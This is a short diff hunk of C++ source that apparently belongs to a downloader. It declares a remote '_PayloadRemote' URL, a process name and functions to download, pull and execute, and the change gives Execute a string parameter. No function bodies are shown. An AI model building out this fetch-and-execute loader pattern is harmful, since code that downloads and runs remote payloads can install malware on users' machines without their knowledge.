@@ -24,7 +24,7 @@ const std::string _PayloadRemote("https://www.cleverfiles.com/howto/wp-content/u
 const std::string  _ProcName("TestProcess");
 
 bool FileExists(std::string);
-void Execute();
+void Execute(std::string);
 int  Pull();
 void Download();
 bool ProcessRunning();
